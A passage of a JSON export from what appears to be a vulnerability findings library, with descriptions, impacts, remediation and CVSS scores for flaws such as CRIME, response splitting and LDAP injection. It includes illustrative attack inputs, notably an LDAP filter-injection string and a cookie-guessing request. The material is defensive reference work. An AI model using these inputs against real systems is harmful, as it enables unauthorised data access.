NIST:\nhttp://csrc.nist.gov/groups/ST/toolkit/secure_hashing.html\n","cvss_base_score":6.4,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:P/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":785,"plugin_id":null,"title":"HTTPS/SPDY CRIME Information Leakage","type":null,"description":"The server's SSL/TLS configuration is vulnerable to the CRIME (\"Compression Ratio Info-leak Made Easy\") information leakage attack. SSL/TLS \"CRIME\" information leakage occurs when plaintext data is compressed prior to encryption without obfuscating the plaintext content's length. It affects the SSL/TLS and SPDY protocols that use data compression.\nThe CRIME attack takes advantage of the repetition-finding properties present in compression algorithms used by SSL/TLS and SPDY. If an attacker can repeatedly inject presumed copies of sensitive data into the body of a request, an inference about the sensitive data can be made based on the resulting compressed data length.\nIn practice, the attack works best against session cookies. A man-in-the-middle (MiTM) attacker must be able to:\n--Observe the victim's network traffic\n--Cause the victim's browser to submit requests to the target site (e.g. when the victim visits an attacker-controlled page or when the attacker is able to inject scripts into responses to plain-text HTTP requests made by the victim)\n\nOnce these requirements are met, the attack scenario may begin. For example, suppose that a user's session cookie takes the following form in every HTTP request:\n<pre>Cookie: sessionid=da1tocbcpwjv1hrnvfg28nbz </pre>\nWithin the user's browser, an attacker can craft JavaScript code that sends the following HTTP request:\n<pre>POST / HTTP/1.1 Host: example.com Cookie: sessionid=cr1tocbcpwjv1hrnvfg28nbz Accept-Encoding: gzip, deflate Connection: keep-alive  Cookie: sessionid=a </pre>\nThe SSL/TLS compression algorithm will reduce the twice repeated Cookie: sessionid= sequences. A MiTM attacker will not be able to see the session cookie's value; however, they will be able to observe the length of the encrypted traffic. An attacker will then send a similar request, this time with Cookie: sessionid=b, then with Cookie: sessionid=c, and so on. Each of these requests will compress to the same size. Once a request with Cookie: sessionid=d is sent, the compressed text will be shorter since the repeated sequence is now 19 bytes instead of 18. Observing this change, an attacker can infer that the first byte of the session cookie is \"d\". This iterative process can then be repeated until the full cookie is recovered.\n","poc":null,"impact":"A successful attack results in sensitive information being leaked from an encrypted SSL/TLS connection. Depending on the data being transmitted, an attacker may be able to recover session identifiers, passwords, etc.\n","remediation":"Disabling SSL/TLS compression is the recommended approach to mitigating CRIME Information Leakage.\nNote that disabling SSL/TLS compression is different from disabling HTTP compression and will almost always have no adverse effects. When HTTP compression is enabled, SSL/TLS compression will only compress HTTP request and response headers - a small percentage of the traffic compared to the body of web application pages.\n","cvss_base_score":2.6,"cvss_temporal_score":2.2,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:N/E:ND/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":786,"plugin_id":null,"title":"Apache Expect Header Cross-site Scripting","type":null,"description":"This version of the Apache web server does not handle malformed Expect headers correctly. The Expect header is part of the HTTP specification, and it allows clients to indicate to servers that they require certain behaviours. This header is used by older browsers and certain kinds of Adobe Flash applications. For example, a client may indicate to the server that it intends to send a large file by sending an Expect: \"100 - Continue\" header. The file is sent from the client to the server only after the server responds with a \"100-Continue\" header. In situations where the server receives unexpected or malformed data in the Expect header, a default error page is returned that includes the data supplied in the Expect header. In older versions of Apache, the Expect header data received is inserted into the error page with no prior sanitization or encoding.\n","poc":null,"impact":"An attacker able to manipulate the contents of the Apache Expect HTTP header would be able to execute a cross site scripting (XSS) attack by injecting HTML and JavaScript into the Expect header, which is rendered in the victim's browser when returned in the Apache malformed Expect header error page.\n","remediation":"Upgrade to the latest version of the Apache web server. This vulnerability was fixed in Apache HTTP server version 1.3.35. Note that versions 1.3.x are no longer actively maintained, and application owners should consider migrating to the latest releases in the 2.2.x or 2.4.x branches to ensure that they receive timely security patches.\n","cvss_base_score":8,"cvss_temporal_score":7,"cvss_vector":"(AV:N/AC:L/Au:S/C:P/I:C/A:P/E:H/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:28:16","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":787,"plugin_id":null,"title":"iOS: Copy and Paste Information Disclosure","type":null,"description":"The application allows disclosure of sensitive information via a public UIPasteboard object. Data copied to these pasteboards can be accessed by any other application on the system, even after the application terminates. This data can also be written to disk.\n","poc":null,"impact":"\n","remediation":"If the application does not need to support copy and paste at all, remove all use of and references to UIPasteboard objects.\nIf there is a need for the application to copy and paste data within itself but not to other applications, use a unique, private, non-persistent pasteboard.\n","cvss_base_score":4.9,"cvss_temporal_score":4.1,"cvss_vector":"(AV:L/AC:L/Au:N/C:C/I:N/A:N/E:F/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"Minimal","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":788,"plugin_id":null,"title":"HTTP Response Splitting","type":null,"description":"HTTP response splitting occurs when the application accepts untrusted data containing a carriage return and line feed (CR+LF), and uses it to construct headers in the HTTP response. A carriage return (CR, ASCII 0x0D) + line feed (LF, ASCII 0x0A) sequence can be sent to the server, which is then injected into the server response's HTTP header (often through a redirection or cookie). Per the HTTP standard (RFC 2616), headers are separated by one CR+LF and the response's headers are separated from its body by two CR+LFs. A user can combine these conditions in the application to send data to the server which, when inserted into a response, creates new lines of content which are then interpreted as legitimate response data by the user's browser.\n","poc":null,"impact":"An attacker can exploit HTTP response splitting to set arbitrary headers, take control of the HTTP response body, or break the response into two or more separate responses by injecting CR+LF sequences with additional lines of data. This enables an attacker to display arbitrary content or execute code in the victim's browser, leading to a variety of attacks including cross-site scripting and open URL redirects to third-party sites.\n","remediation":"The application should not use untrusted data to dynamically generate response headers. If the application must use untrusted data to create response headers, the application should sanitize untrusted input by allowing only expected values in addition to explicitly blacklisting CR+LF and their encoded equivalents. For example, if the untrusted data is passed in the URL, the URL encoded value of CR+LF, namely %0D%0A, should be blacklisted.\n","cvss_base_score":5.6,"cvss_temporal_score":4.6,"cvss_vector":"(AV:N/AC:H/Au:S/C:N/I:C/A:P/E:F/RL:OF/RC:C/CDP:ND/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":789,"plugin_id":null,"title":"Insecure Password Reset","type":null,"description":"Insecure Password Reset vulnerabilities commonly occur in systems that allow users to reset their passwords using a \"side-channel\" authentication mechanism, which relies on an alternative mode of authentication. Such a mechanism requires the user to answer one or more previously completed security questions. Examples of said information include: a user's mother's maiden name, favorite car make, favorite number or other items whose answers are easily predictable or highly correlated.\nA large amount of said information can be found within public records or social networking sites, and is easily accessible by a prepared attacker who has planned and researched their victim and attack vector.  In cases where no additional form of validation exists to verify the user, an attacker would be able to deny a user access to their account, by continuously resetting the password, invalidating any pre-existing credentials.\n","poc":null,"impact":"Exploiting an Insecure Password Reset vulnerability can lead to the compromise of user accounts and / or denial of service. An attacker can take advantage of such a vulnerability to steal user accounts and thereby impersonate the victims. The potential also exists for an attacker to deny users access to their accounts. This is done by resetting the password continuously, invalidating their current credentials, resulting in a denial of service attack.\n","remediation":"Password reset mechanisms must ensure that the user's identity is verified prior to resetting the account password of said user.\nWhen verifying a given user's identity, out-of-band communication is vital to ensure that any password reset requests are being issued by the appropriate user. This measure prevents an attacker from continuously denying the user access to their account by invalidating their account password, and reduces the risk of account compromise.\nA common way to implement out-of-band verification involves contacting the user via their registered email or telephone number and including a password-reset link or verification code in the message. When the user clicks the link or submits the verification code, the application checks that the verification value is valid before allowing the user to set a new password.\n","cvss_base_score":4,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:S/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":790,"plugin_id":null,"title":"AMF Injection","type":null,"description":"An AMF injection defect exists when user-supplied data sent in the Flash AMF request is used immediately by server-side scripts to generate an AMF response returned to the browser without properly sanitizing the input. An attacker may be able to leverage this vulnerability to cause the Flash application to behave in various adverse ways depending on the functionality of the application. This may include injecting JavaScript, HTML, or other web languages, and having these script execute in the context of the users browser. This is generally very difficult for an attacker to exploit with AMF Injection, but if it is possible it could allow an attacker to hijack the user's session and perform actions as that user or redirect a legitimate user to an attacker-controlled page or external site.\n","poc":null,"impact":"\n","remediation":"The first step toward mitigating AMF injection attacks is to validate every application input to prevent acceptance of any characters that may have special meaning within the application or in the final destination of the data (in this case, the browser). All input should be sanitized; not just parameters that the user is supposed to provide, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. The recommended method of input validation is to employ a white-list filter of known-good characters, causing the application to accept only inputs that have expected values. Input validation routines should always check the data for length, range, type and format.\nIn addition to input validation, output encoding provides a second layer of defense against cross-site scripting attacks. Output encoding can be used even when input validation isn't possible because the format and semantic meaning of the data is unknown, or because the input may legitimately include control characters. In the case of data being returned to the user's web browser, output encoding requires converting characters that may be treated as code (e.g., <, >, \", ') to their appropriate HTML entities (\"<\", \">\", \"\"\", \"&apos;\"). This way, these characters will be treated as data by the web browser instead of being executed as code.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"Low","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":791,"plugin_id":null,"title":"Missing Authentication","type":null,"description":"An application resource fails to perform authentication checks against users who request access to that resource. This can take the form of \"security through obscurity,\" wherein only users who need access to a resource know how to access that resource. (A common use case is a \"hidden URL\" to a privileged web application feature, which is only displayed to users believed to have a need for the feature.) It can also take the form of performing \"identification\", but not actual authentication. That is to say that the user identifies itself as a certain user, but provides no evidence to prove that identity, and the application does not require such evidence. This can make it trivial to impersonate a privileged user.\n","poc":null,"impact":"When an application resource (or an entire application) is missing authentication, the resource provided is potentially available to any user who has connectivity to the application. The severity of this vulnerability will depend upon the criticality of the resource that is missing authentication. (E.g., administrative functionality is likely more critical than standard privileged user functionality). If authentication is not present, the existence of roles and users no longer applies. All users will effectively hold all privileges for the resource in question.\n","remediation":"Authentication should be implemented for all resources that require any form of restriction from users. Consider the use of a central framework that provides access control functionality, such as ASP.NET's access control feature, Spring Security, etc. These provide the ability to declaratively associate roles with resources and, more importantly, enforce authentication as the cornerstone of the access control model.\nIf a framework is not employed, ensure that a strong authentication mechanism exists. There are several to choose from, including forms-based authentication (over HTTPS), OpenID, and PKI client certificates. Additionally, ensure that every protected resource consistently and comprehensively enforces the authentication requirement.\n","cvss_base_score":8.5,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:C/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:28:05","approved":1,"v_likelihood":"Critical","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":792,"plugin_id":null,"title":"Low Entropy on Session Identifier","type":null,"description":"The application session identifier has low entropy which makes it predictable. This could be because the session identifier is based on a sequential value, a time-stamp, the userid, or other factors which are not cryptographically random. This can allow an attacker to predict the session identifier through statistical analysis and take over an authenticated user's session.\n","poc":null,"impact":"Using a session identifier with low entropy can allow an attacker to guess or brute-force a valid session token and gain unauthorized access to the application.\n","remediation":"Modify the mechanism for creating the session identifiers so that it uses a cryptographically secure pseudo-random number generator (CSPRNG) to generate session identifiers which are of at least a length of 64-bits / 128 bits of entropy. For a good CPRNG, the entropy of the value is estimated to be half the length of the session ID. Therefore, it is recommended to generate 128/256 bits long session IDs.\n","cvss_base_score":7.8,"cvss_temporal_score":6.5,"cvss_vector":"(AV:N/AC:M/Au:N/C:C/I:P/A:N/E:F/RL:OF/RC:C/CDP:LM/TD:ND/CR:H/IR:M/AR:H)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":793,"plugin_id":null,"title":"Clear Text submission of Password","type":null,"description":"Passwords submitted over an unencrypted connection are vulnerable to capture by an attacker who is suitably positioned on the network. This includes any malicious party located on the user's own network, within their ISP, within the ISP used by the application, and within the application's hosting infrastructure. Even if switched networks are employed at some of these locations, techniques exist to circumvent this defense and monitor the traffic passing through switches.\n","poc":null,"impact":"\n","remediation":"The application should use transport-level encryption (SSL or TLS) to protect all sensitive communications passing between the client and the server. Communications that should be protected include the login mechanism and related functionality, and any functions where sensitive data can be accessed or privileged actions can be performed. These areas of the application should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications. If HTTP cookies are used for transmitting session tokens, then the secure flag should be set to prevent transmission over clear-text HTTP.\n","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Critical","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"High","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":794,"plugin_id":null,"title":"Web Application Server-Side Source Code Disclosure","type":null,"description":"Server-side web application source code can be viewed through HTTP requests. Examples of source code disclosure include snippets of code revealed in HTML or JavaScript, or an attacker forcefully browsing to a guessed file location (e.g. struts-config.xml in Struts Java applications). Source code disclosures are often the result of misconfigured file system permissions, leftover debug statements in client-side code, and web server vulnerabilities.\n","poc":null,"impact":"Exposing a web application's server-side source code gives the attacker an advantage in finding and crafting exploits. The attacker can perform code review to determine specific points of entry and craft payloads to evade validation routines or exploit business logic flaws. The attacker may also discover hard-coded credentials, internal server locations, and other information useful in compromising the application and network. Disclosure of compiled binaries results in the same consequence as they can be reverse engineered.\n","remediation":"Application source code should be removed from any resources and data served to users. The following measures can be taken to reduce the risk of this vulnerability:\n--Do not leave server-side source code snippets in HTML or JavaScript comments.\n--Configure file permissions in such a way that all contents of the web root folder can only be accessed by the web application account.\n--Never leave backup files (e.g. \"index.php.bak\") under the web root hierarchy. A request to one of these files will return the contents of the file, even for interpreted languages, as these files will not be executed by the interpreter.\n--Make sure the web root directory is clear of any temp files created by editors.\n--Validate the folder from where the file to be downloaded is being requested (maintain a white list of directory names from where files are allowed to be downloaded and validate the requests based on this).\n--Validate the file types that are requested by users.\n--Index files to be downloaded and pass only their index numbers as the URL parameter values.\n\n","cvss_base_score":2.1,"cvss_temporal_score":1.6,"cvss_vector":"(AV:N/AC:H/Au:S/C:P/I:N/A:N/E:U/RL:OF/RC:C/CDP:ND/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"Medium","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":795,"plugin_id":null,"title":"Unencrypted Login Request","type":null,"description":"The client sends user credentials to the server over an insecure channel during authentication.\n","poc":null,"impact":"Unencrypted login requests expose user credentials to any entity monitoring traffic on the network between the client and server. An attacker monitoring traffic on the network between the victim's client and the server may be able to obtain the victim's credentials, authenticate to the application and impersonate that user.\n","remediation":"The application should send user credentials and any other sensitive information over a secure channel.  For example, the application should use HTTPS rather than HTTP.\nTLS should be enabled on the application server. The exact process of enabling TLS depends on the technology stack, but there are common considerations for all TLS implementations. The first consideration is to only use TLS v1.1 or v1.2; if possible, SSL v2, SSL v3 and TLS v1.0 should be avoided due to known protocol security vulnerabilities. The second consideration is to only support strong cryptographic ciphers. The properties of strong cryptographic ciphers are ciphers that contain authentication and have a key size of 128 bits or higher.\nIn addition to the previous configuration changes, these best practices should be followed to prevent known attacks against TLS/SSL:\n--Disable TLS compression\n--Disable client-integrated renegotiation\n--Generate a certificate per host, avoid wildcard certificates\n\nFor more information on protecting transport layer security, see the Transport Layer Protection Cheat Sheet created by OWASP at https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet\n","cvss_base_score":6.1,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:N/C:C/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"Medium","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":796,"plugin_id":null,"title":"isValidFragment() Not Found in Class that Extends PreferenceActivity (Android)","type":null,"description":"The application contains a class that extends the PreferenceActivity class but does not override the isValidFragment() method to limit the permissible fragments to a whitelist, indicating that it may be vulnerable to fragment injection.\nWhen an exported class that extends PreferenceActivity receives an intent with the :android:show_fragment extra specified, it passes the fragment name to the class's isValidFragment() method, which acts as a filter. If this method returns true, the application uses reflection to dynamically load the class with the corresponding name. Conversely, if the method returns false, the corresponding class is not loaded. Depending on the particular fragment that is loaded, an attacker may be able to bypass business logic by exploiting code that assumes it is being run in a trusted context (i.e. code that does not expect to be run as a result of an arbitrary intent).\nThe default implementation of the isValidFragment() method for applications built for Android SDK versions older than 4.4 KitKat (API level 19) returns true unconditionally, meaning that all fragments defined by the application are capable of being loaded, whether or not they are meant to be. This behavior matches the behavior of applications built prior to API level 19, when the isValidFragment() method did not exist. For applications using an earlier API level, all fragments are capable of being loaded.\nThe default implementation of the isValidFragment() method for applications built for Android SDK versions 4.4 KitKat (API level 19) and above throws an exception unconditionally, meaning that no fragments are capable of being loaded via an intent to the activity. Therefore, applications targeting these SDK versions must override the isValidFragment() method to return true or false based on some criteria. Classes that extend PreferenceActivity but do not override the method in this case will cause the application to crash upon receiving a fragment-loading intent, effectively creating a denial-of-service vulnerability. If the PreferenceActivity subclass is defined to run in a separate process, as specified in the application manifest, the denial-of-service will be limited to the individual activity, rather than the whole application.\nIn both cases, the application is vulnerable to fragment injection if the fragments that are capable of being loaded mistreat untrusted data or perform some unintended activity upon being instantiated. The absence of an overridden isValidFragment() method only indicates that the application does not explicitly filter fragments, making it more likely to be vulnerable to fragment injection for SDK targets before API level 19, which permits all fragments defined by the application to be loaded. The mere presence of an overridden isValidFragment() method does not indicate that the application is not vulnerable to fragment injection. It only limits the list of fragment classes that must take precautions against fragment injection.\n","poc":null,"impact":"Fragment injection allows an attacker to access and run otherwise inaccessible portions of the application, which can lead to the bypass of business logic. This may result in the exploitation of code that assumes it is being run in a trusted context. Additionally, in Android KitKat (API level 19) and above, the absence of an isValidFragment() method can allow other applications to crash the application by sending an intent to it.\n","remediation":"For applications making use of API level 19 and above, the application should override the PreferenceActivity class's isValidFragment() method in order to limit the fragments that are capable of being loaded to a whitelist. If the application expects no fragments to be instantiated, it should override the isValidFragment() method to return false unconditionally. For applications making use of earlier API levels, all fragment classes should be audited to ensure that they properly handle potentially untrusted data when instantiated via an intent.\n","cvss_base_score":6.2,"cvss_temporal_score":4.6,"cvss_vector":"(AV:L/AC:H/Au:N/C:C/I:C/A:C/E:U/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":797,"plugin_id":null,"title":"Password in HTTP Response","type":null,"description":"The application server includes the password in an HTTP response. This could allow an attacker who temporarily gains access to the user's machine to retrieve the password value from the web browser cache, or if the user is currently logged on by viewing the current HTML traffic. Once the attacker had the password he would be able to masquerade as the user in the application.\n","poc":null,"impact":"\n","remediation":"Remove the password from all HTTP responses from the server. There is typically no business reason to have the password reflected back to the user after it is originally entered.\n","cvss_base_score":3.5,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:S/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:23","updated_at":"2018-11-12 09:25:23","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":798,"plugin_id":null,"title":"Application Test Pages Discovered","type":null,"description":"The application contains test pages which are accessible to the user. Developers often create test pages for debugging purposes but forget to remove them from production. As a result of their content or even their naming convention, test pages may expose certain information about an application's environment and infrastructure. In addition, test pages may contain functionality that bypasses authentication or authorization checks, or provides users with access to functionality that should not be available. Even if the application does not expose these pages by linking to them, they may be accessible by guessing using common naming conventions, such as test.aspx or test.php, or by brute-forcing page names.\n","poc":null,"impact":"Test pages may leak sensitive information about the application's configuration and technology stack. An attacker could use this information to more efficiently discover known vulnerabilities in these components and attack the application. In addition, test pages containing application functionality may provide an attacker with the means to bypass authentication or authorization checks, exposing sensitive information and allowing the attacker the ability to perform actions they are not authorized to perform.\n","remediation":"Test pages and functionality should be removed from the application before it is moved into production.\n","cvss_base_score":2.1,"cvss_temporal_score":1.6,"cvss_vector":"(AV:N/AC:H/Au:S/C:P/I:N/A:N/E:POC/RL:OF/RC:C/CDP:ND/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:24","updated_at":"2018-11-12 09:25:24","approved":1,"v_likelihood":"Medium","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":799,"plugin_id":null,"title":"Client Side SQL Statements","type":null,"description":"The application makes use of SQL statements that originate from the client-side. Client-side SQL statements reveal information about the underlying database structure being utilized, as well as potentially allowing for any arbitrary query to be crafted and executed. This could potentially allow an attacker to return more data than they should be able to see, delete data within the database, or in some cases execute operating system commands on the server.\n","poc":null,"impact":"\n","remediation":"Never create or store SQL statements in a place where the user can view or edit them. If parameters that determine the query need to originate from the client-side, they should be sent as individual parameters, checked against known good values in a white-list, and then assembled into the appropriate parameterized query.\n","cvss_base_score":8.5,"cvss_temporal_score":7.4,"cvss_vector":"(AV:N/AC:L/Au:S/C:C/I:C/A:N/E:H/RL:OF/RC:C/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:24","updated_at":"2018-11-12 09:28:07","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":800,"plugin_id":null,"title":"LDAP Injection","type":null,"description":"The application executes LDAP queries generated by concatenating untrusted user input to static LDAP query strings. In this design, the LDAP directory has no way to distinguish between LDAP control characters and user defined data. As a result, any LDAP syntax present will be interpreted as LDAP query syntax and executed, causing the LDAP query's structure to be modified, returning unexpected results.\nConsider the following example of a filter that accepts the user defined parameter \"username\":\n<pre><code class=\"java\">String username = request.getParameter(\"username\"); String filter = \"(name=\" + username + \")\"; </pre>\nIn expected usage, this filter would filter the directory on a particular user name. An attacker can submit the following string, however:\n<pre><code class=\"ldif\">user1)|(uid=* </pre>\nThis results in the execution of an LDAP query with the following filter:\n<pre><code class=\"ldif\">(name=user1)|(uid=*) </pre>\nThe addition of the \")|(uid=*\" causes this query to always evaluate to true, thereby returning a list of all users and their properties.\n","poc":null,"impact":"LDAP injection allows an attacker to execute arbitrary LDAP commands. An attacker may exploit this vulnerability to create, view, or modify sensitive information about users and hosts stored in the directory structure.\n","remediation":"The application should perform appropriate character escaping on all untrusted data used in LDAP queries. Many libraries and application frameworks provide filter and distinguished name escaping for constructing LDAP queries. The syntaxes for filters (used to search for multiple entries matching a set of criteria) and distinguished names (used to search for a particular entry) are different and require separate escaping schemes.\nFor LDAP filters, RFC 2254 requires that the characters '*', '(', ')', '\\', and the NULL character must be escaped as a backslash followed by the two hexadecimal digits representing the ASCII value of the character (\"\\XX\"). For example, an asterisk would be escaped and replaced with \"\\2a\".\nFor distinguished names, RFC 2253 lists a set of requirements for character escaping:\n--If a '#' character appears at the beginning of the string, it must be escaped\n--Spaces at the beginning or end of the string must be escaped\n--The characters ',', '+', '\"', '\\', '<', '>', and ';' must be escaped (comma, plus, double-quote, backslash, less-than, greater-than, semi-colon, respectively)\n\nLibraries for implementing the two escaping schemes exist for most popular programming languages.\n--Spring LDAP: Java\n--Microsoft Web Protection Library: .NET languages\n--ldap_escape() function: PHP\n\n","cvss_base_score":6.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:S/C:C/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:24","updated_at":"2018-11-12 09:25:24","approved":1,"v_likelihood":"Medium","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":801,"plugin_id":null,"title":"Insecure Compiler Settings","type":null,"description":"The application is written in Microsoft Visual C++, but it is not compiled using Microsoft recommended security best practices.  We observed that the executable with compiled without the NX, SafeSEH, and Dynamic Base (ASLR) compiler options.\nNX and ASLR are mitigation techniques that increase the difficult of exploiting buffer overflow vulnerabilities. A program that uses NX will set writeable portions of memory to \"non-executable\" so that injected memory cannot be run. Address Space Layout Randomization (ASLR) makes sure that every time an application is loaded into memory it is randomly loaded into a different memory address. In doing so, even if an attacker is able to inject something into a portion of memory that is able to be made executable, they still have the difficulty of finding where their payload was loaded so that they are able to execute it to cause the exploit.\nThe SafeSEH flag protects against an exploit which defeats stack protection by overwriting the stack exception handler. It operates by creating a static list of safe exception handlers provided by the application.\nThe missing NX and Dynamic Base compiler checks are only problematic if there is a buffer overflow vulnerability in the client application.  We do not have knowledge of such a vulnerability at this time. Additionally, the SafeSEH flag is only a concern on x86 systems - x64 and Itanium systems are not vulnerable to SEH exploits.\n","poc":null,"impact":"An exploitable remote buffer overflow vulnerability would allow arbitrary code execution on any computer with the application installed.\n","remediation":"Ensure that the /NXCOMPAT, /SAFESEH, and /DYNAMICBASE flags are passed into the linker command when building the Lockdown application. The instructions for configuration these compiler settings will change depending on the compilation tool. In Visual Studio, these flags can be added on the project's properties page, under Configuration Properties > Linker > Advance.\nFor more information on setting these flags, see the following help pages:\n--http://msdn.microsoft.com/en-us/library/bb384887.aspx\n--http://msdn.microsoft.com/en-us/library/ms235442.aspx\n--http://msdn.microsoft.com/en-us/library/9a89h429.aspx\n\n","cvss_base_score":5.4,"cvss_temporal_score":4.7,"cvss_vector":"(AV:N/AC:H/Au:N/C:N/I:C/A:N/E:ND/RL:OF/RC:ND/CDP:MH/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:24","updated_at":"2018-11-12 09:25:24","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":802,"plugin_id":null,"title":"Unmasked NPI Data","type":null,"description":"Nonpublic personal information (NPI) is displayed in clear text to the end user. NPI is any nonpublic information which can be used to identify an individual. The following are examples of NPI:\n--Social security number\n--Primary Account Number (PAN)\n--Passport number\n\n","poc":null,"impact":"Including unmasked NPI in application responses may result in the exposure of sensitive information and a loss of confidentiality. NPI included in application responses may be exposed in several ways:\n--Shoulder-surfing or other unauthorized access to the client's system while the victim is logged in\n--Cached responses on the client's system or on systems that route traffic between the client and server\n--Network-based man-in-the-middle attacks\n\n","remediation":"Nonpublic personal information (NPI) should be masked or obfuscated in all application input fields and when it is displayed back to the user. NPI should be masked server side before being sent to the client to be displayed. This will ensure that an end user cannot view the un-masked data (e.g. via HTML source), as well as prevent the data from being intercepted in transit to the client. For example, when the application wants to display a user's social security number, the server should mask it to only show the last four digits while the first five are represented by a place holder, such as an asterisk.\n","cvss_base_score":2.6,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:24","updated_at":"2018-11-12 